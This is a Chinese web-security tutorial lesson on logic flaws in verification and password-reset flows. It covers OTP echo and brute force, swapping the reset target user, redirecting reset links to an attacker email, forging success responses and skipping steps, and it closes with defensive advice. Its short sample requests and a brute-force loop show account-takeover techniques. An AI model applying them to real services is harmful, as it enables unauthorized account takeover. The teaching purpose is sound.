# 第74课：机制验证与逻辑绕过实战 🎯

![](img/1627367a4b1639139fb36057e7d3dfdc_0.png)

在本节课中，我们将学习Web应用安全中常见的验证机制逻辑漏洞。我们将重点探讨验证码突破、用户重定向、响应包修改等核心攻击手法，并通过真实案例演示其原理与利用方式。

## 概述 📋

验证机制是保护用户账户安全的重要防线，常见于密码找回、信息修改等场景。然而，如果逻辑设计存在缺陷，攻击者可能绕过验证，实现未授权操作。本节课将系统性地分析这些逻辑漏洞的成因、利用方法及防御思路。

![](img/1627367a4b1639139fb36057e7d3dfdc_2.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_4.png)

---

![](img/1627367a4b1639139fb36057e7d3dfdc_6.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_8.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_10.png)

## 一、验证码突破 🔓

![](img/1627367a4b1639139fb36057e7d3dfdc_12.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_14.png)

上一节我们介绍了验证机制的整体概念，本节中我们来看看针对验证码本身的两种主要突破方式。

### 1. 验证码回显

![](img/1627367a4b1639139fb36057e7d3dfdc_16.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_18.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_20.png)

在某些情况下，验证码会在请求或响应数据包中直接泄露（回显）。这意味着攻击者无需获取目标手机或邮箱，即可直接得知验证码。

![](img/1627367a4b1639139fb36057e7d3dfdc_22.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_24.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_26.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_28.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_30.png)

**核心原理**：服务器在返回的响应包中包含了本次发送的验证码明文。
```http
HTTP/1.1 200 OK
...
{"code": "123456", "status": "success"}
```

![](img/1627367a4b1639139fb36057e7d3dfdc_32.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_34.png)

### 2. 验证码爆破

当验证码满足以下条件时，可尝试爆破：
1.  **验证码存活时间较长**（例如超过1分钟）。
2.  **无尝试次数限制**或限制宽松。
3.  **验证码复杂度较低**（例如4-6位纯数字）。

![](img/1627367a4b1639139fb36057e7d3dfdc_36.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_37.png)

**核心原理**：利用自动化工具遍历所有可能的验证码组合（如0000-9999），直到匹配成功。
```python
# 简化的爆破思路
for guess in range(0, 10000):
    code = str(guess).zfill(4) # 生成4位数字，不足补零
    response = submit_verification_code(code)
    if response.is_success():
        print(f"成功！验证码为: {code}")
        break
```

![](img/1627367a4b1639139fb36057e7d3dfdc_39.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_41.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_43.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_45.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_47.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_49.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_51.png)

**以下是爆破操作的关键步骤：**
*   使用抓包工具（如Burp Suite）拦截提交验证码的请求。
*   将验证码参数发送到Intruder模块。
*   根据验证码规则（如4位数字）设置Payload。
*   通过对比响应包长度或内容判断爆破是否成功。

![](img/1627367a4b1639139fb36057e7d3dfdc_53.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_55.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_57.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_59.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_61.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_63.png)

---

![](img/1627367a4b1639139fb36057e7d3dfdc_65.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_67.png)

## 二、针对验证目标的攻击 🎯

![](img/1627367a4b1639139fb36057e7d3dfdc_69.png)

验证码难以突破时，可以转向攻击验证的目标对象，即“重定向”攻击。

### 1. 重定向用户（修改目标）

![](img/1627367a4b1639139fb36057e7d3dfdc_71.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_73.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_75.png)

在密码重置流程中，攻击者利用自己账号接收正确的验证码，但在最终提交重置请求时，将目标用户参数修改为他人。

![](img/1627367a4b1639139fb36057e7d3dfdc_77.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_79.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_81.png)

**漏洞逻辑**：服务器在验证验证码正确后，未严格绑定验证码与最初申请重置的用户，允许在后续步骤中更改重置目标。
```http
POST /resetPasswordStep2 HTTP/1.1
...
verify_code=123456&target_user=victim@example.com # 将target_user改为攻击者想重置的账户
```

![](img/1627367a4b1639139fb36057e7d3dfdc_83.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_85.png)

### 2. 重定向发送（修改接收地址）

![](img/1627367a4b1639139fb36057e7d3dfdc_87.png)

在发送验证码或重置链接的环节，数据包中可能存在指定接收地址的参数（如`email`、`callback_url`）。攻击者将其修改为自己的地址，从而接收本应发送给目标用户的验证信息。

![](img/1627367a4b1639139fb36057e7d3dfdc_89.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_91.png)

**漏洞逻辑**：服务器信任了客户端传来的接收地址参数，未校验其是否与目标用户绑定信息一致。
```http
POST /sendResetLink HTTP/1.1
...
username=victim&send_to=attacker@evil.com # 将发送地址篡改为攻击者邮箱
```

![](img/1627367a4b1639139fb36057e7d3dfdc_93.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_95.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_97.png)

---

![](img/1627367a4b1639139fb36057e7d3dfdc_99.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_101.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_103.png)

## 三、验证逻辑绕过 ⚙️

当验证逻辑主要依赖前端（浏览器）完成时，可能通过修改通信数据来绕过。

![](img/1627367a4b1639139fb36057e7d3dfdc_105.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_107.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_109.png)

### 1. 修改响应包

![](img/1627367a4b1639139fb36057e7d3dfdc_111.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_113.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_115.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_117.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_119.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_121.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_123.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_125.png)

前端JavaScript代码常根据服务器返回的特定状态码（如`200`成功，`400`失败）或字段值来决定是否通过验证。攻击者通过代理工具拦截响应，将失败的响应修改为成功的响应。

**核心原理**：前端仅以返回的HTTP状态码或JSON字段作为验证依据，服务端未进行二次校验。
```javascript
// 前端验证逻辑示例
fetch('/verifyCode', { method: 'POST', body: data })
    .then(response => response.json())
    .then(result => {
        if (result.status === 'success') { // 仅依赖此字段判断
            proceedToNextStep(); // 进入下一步
        } else {
            showError('验证码错误');
        }
    });
```
**注意**：此方法是否有效，取决于服务端是否仅依赖前端状态。若服务端有独立会话状态记录，则前端绕过无效（即“自慰”漏洞）。

![](img/1627367a4b1639139fb36057e7d3dfdc_127.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_129.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_131.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_133.png)

### 2. 跳过步骤

![](img/1627367a4b1639139fb36057e7d3dfdc_135.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_137.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_139.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_141.png)

多步骤验证流程（如：1.输入账号 -> 2.验证身份 -> 3.重置密码）中，如果每一步没有严格校验上一步是否已完成，攻击者可能直接访问后续步骤的URL，跳过身份验证。

![](img/1627367a4b1639139fb36057e7d3dfdc_143.png)

**漏洞逻辑**：流程控制不严谨，步骤间缺乏强关联的状态验证。
```
正常流程：/step1 -> /step2 -> /step3
攻击路径：直接访问 /step3
```

![](img/1627367a4b1639139fb36057e7d3dfdc_145.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_147.png)

---

![](img/1627367a4b1639139fb36057e7d3dfdc_149.png)

## 四、案例与实战分析 🔍

我们结合一个虚构的“交友App”案例，演示如何综合运用上述思路。

![](img/1627367a4b1639139fb36057e7d3dfdc_151.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_153.png)

**测试过程：**
1.  **信息收集**：浏览App功能，抓包发现多个API接口返回了用户的敏感信息（如生日、体重、`user_id`），存在信息泄露。
2.  **功能测试**：测试“换绑手机”功能。拦截发送验证码请求，尝试修改手机号参数。
3.  **验证绕过**：输入错误验证码提交，拦截返回包，将表示失败的`status: false`改为`status: true`，前端显示“绑定成功”。
4.  **逻辑分析**：尝试在密码重置流程中，于验证验证码的步骤，将请求包中的`user_id`参数修改为其他用户的ID，尝试实现重定向用户攻击。

![](img/1627367a4b1639139fb36057e7d3dfdc_155.png)

**核心发现**：该应用在多个环节存在客户端信任问题，包括信息过度返回、验证状态前端依赖等。

![](img/1627367a4b1639139fb36057e7d3dfdc_157.png)

---

![](img/1627367a4b1639139fb36057e7d3dfdc_159.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_161.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_163.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_165.png)

## 总结 📝

![](img/1627367a4b1639139fb36057e7d3dfdc_167.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_169.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_171.png)

本节课我们一起学习了Web验证机制中常见的逻辑漏洞：

![](img/1627367a4b1639139fb36057e7d3dfdc_173.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_175.png)

1.  **验证码突破**：关注回显与爆破的可能性。
2.  **目标重定向**：利用数据包参数修改攻击对象（用户）或接收地址（发送）。
3.  **逻辑绕过**：通过修改响应包伪造成功状态，或直接跳过验证步骤。
4.  **漏洞根源**：根本原因在于“服务器未充分校验客户端提交数据的真实性”以及“业务流程状态控制不严”。

![](img/1627367a4b1639139fb36057e7d3dfdc_177.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_179.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_181.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_183.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_185.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_187.png)

**防御建议**：
*   验证码不在网络传输中回显。
*   服务端对验证码实施短时效、低次数限制。
*   关键操作（如重置密码）的每一步，服务端都应校验前置步骤是否已在当前会话中正确完成。
*   最终执行操作的请求，必须服务端重新验证用户身份（如通过Session中的用户标识），而非依赖客户端传来的参数。
*   遵循“永不信任客户端输入”的原则，对所有输入进行校验。

![](img/1627367a4b1639139fb36057e7d3dfdc_189.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_191.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_193.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_195.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_197.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_199.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_201.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_203.png)

![](img/1627367a4b1639139fb36057e7d3dfdc_205.png)

安全是一个持续的过程，理解攻击手法有助于我们构建更稳固的防御。